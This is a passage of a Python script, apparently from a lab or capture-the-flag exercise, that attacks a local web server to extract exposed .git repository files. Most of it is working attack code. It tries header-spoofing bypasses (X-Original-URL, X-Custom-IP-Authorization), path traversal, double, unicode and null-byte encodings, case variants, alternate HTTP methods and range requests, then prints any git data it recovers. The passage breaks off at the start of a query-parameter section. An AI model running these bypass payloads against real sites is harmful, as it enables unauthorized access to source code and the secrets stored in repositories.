import requests
import urllib.parse
import binascii
import struct
import zlib
import hashlib

target = "http://127.0.0.1:32867"
session = requests.Session()

print("[*] Advanced .git Repository Extraction Bypass Techniques")
print("=" * 70)

# Test files to attempt
test_files = [
    ".git/HEAD",
    ".git/config",
    ".git/index",
    ".git/logs/HEAD",
    ".git/refs/heads/master",
    ".git/refs/heads/main",
    ".git/description",
    ".git/packed-refs"
]

# ============================================================================
# 1. HTTP HEADER MANIPULATION
# ============================================================================
print("\n[1] HTTP HEADER MANIPULATION")
print("-" * 70)

headers_variants = [
    {"X-Original-URL": "/.git/HEAD"},
    {"X-Rewrite-URL": "/.git/HEAD"},
    {"X-Original-URL": ".git/HEAD"},
    {"Accept": "application/octet-stream"},
    {"Accept": "*/*"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Custom-IP-Authorization": "127.0.0.1"}
]

for headers in headers_variants:
    try:
        resp = requests.get(f"{target}/.git/HEAD", headers=headers, timeout=5)
        header_str = ', '.join([f"{k}: {v}" for k, v in headers.items()])
        
        # Check if we got non-HTML response
        if resp.status_code == 200 and 'text/html' not in resp.headers.get('Content-Type', ''):
            print(f"[+] SUCCESS with headers: {header_str}")
            print(f"    Status: {resp.status_code} | Content-Type: {resp.headers.get('Content-Type')}")
            print(f"    Content (first 200 chars): {resp.text[:200]}")
            if 'ref:' in resp.text or 'refs/heads' in resp.text:
                print(f"    [!] VALID GIT DATA FOUND")
                print(f"    Full content: {resp.text}")
        elif resp.status_code == 200:
            content_preview = resp.text[:100].replace('\n', ' ')
            if 'html' not in content_preview.lower():
                print(f"[?] Headers: {header_str} | Status: {resp.status_code} | Preview: {content_preview}")
    except Exception as e:
        pass

# ============================================================================
# 2. PATH TRAVERSAL AND ENCODING
# ============================================================================
print("\n[2] PATH TRAVERSAL AND ENCODING")
print("-" * 70)

path_variants = [
    # Double encoding
    "/%252egit/HEAD",
    "/%252egit/config",
    "/.%2egit/HEAD",
    
    # Path traversal
    "/test/../.git/HEAD",
    "/index.php/../.git/HEAD",
    "/./.git/HEAD",
    "/./test/../.git/HEAD",
    
    # Null bytes
    "/.git%00/HEAD",
    "/.git/HEAD%00",
    "/.git%00.php/HEAD",
    
    # Case variations
    "/.GIT/HEAD",
    "/.Git/HEAD",
    "/.gIt/HEAD",
    
    # Mixed encoding
    "/%2e%67%69%74/HEAD",  # URL encode .git
    "/.%67it/HEAD",
    "/.g%69t/HEAD",
    
    # Backslash variations
    "/.git\\HEAD",
    "\\.git\\HEAD",
    
    # Unicode encoding
    "/%u002egit/HEAD",
    
    # Question mark bypass
    "/.git/HEAD?",
    "/.git/HEAD?.php",
    
    # Semicolon bypass
    "/.git/HEAD;",
    
    # Directory listing attempts
    "/.git/",
    "/.git",
]

for path in path_variants:
    try:
        resp = requests.get(f"{target}{path}", timeout=5)
        
        # Check if we got non-HTML response
        if resp.status_code == 200 and 'text/html' not in resp.headers.get('Content-Type', ''):
            print(f"[+] SUCCESS with path: {path}")
            print(f"    Status: {resp.status_code} | Content-Type: {resp.headers.get('Content-Type')}")
            print(f"    Content (first 200 chars): {resp.text[:200]}")
            if 'ref:' in resp.text or 'refs/heads' in resp.text or '[core]' in resp.text:
                print(f"    [!] VALID GIT DATA FOUND")
                print(f"    Full content: {resp.text}")
        elif resp.status_code in [200, 301, 302]:
            content_preview = resp.text[:80].replace('\n', ' ')
            if 'html' not in content_preview.lower() and len(resp.text) < 200:
                print(f"[?] Path: {path} | Status: {resp.status_code} | Preview: {content_preview}")
    except Exception as e:
        pass

# ============================================================================
# 3. DIRECT FILE ACCESS WITH DIFFERENT METHODS
# ============================================================================
print("\n[3] DIRECT FILE ACCESS - DIFFERENT HTTP METHODS")
print("-" * 70)

methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'TRACE']

for method in methods:
    try:
        resp = requests.request(method, f"{target}/.git/HEAD", timeout=5)
        
        if resp.status_code == 200 and 'text/html' not in resp.headers.get('Content-Type', ''):
            print(f"[+] SUCCESS with method: {method}")
            print(f"    Status: {resp.status_code} | Content-Type: {resp.headers.get('Content-Type')}")
            print(f"    Content: {resp.text}")
    except Exception as e:
        pass

# ============================================================================
# 4. RANGE REQUESTS FOR BINARY DATA
# ============================================================================
print("\n[4] RANGE REQUESTS")
print("-" * 70)

range_headers = [
    {"Range": "bytes=0-100"},
    {"Range": "bytes=0-"},
]

for headers in range_headers:
    try:
        resp = requests.get(f"{target}/.git/HEAD", headers=headers, timeout=5)
        
        if resp.status_code in [200, 206]:  # 206 = Partial Content
            print(f"[+] Range request: {headers['Range']}")
            print(f"    Status: {resp.status_code} | Content-Type: {resp.headers.get('Content-Type')}")
            print(f"    Content: {resp.text}")
            if 'ref:' in resp.text:
                print(f"    [!] VALID GIT DATA FOUND")
    except Exception as e:
        pass

# ============================================================================
# 5. TRY ACCESSING THROUGH QUERY PARAMETERS
# ============================================================================
print("\n[5] QUERY PARAMETER VARIATIONS")
print("-" * 70)

query_variants = [
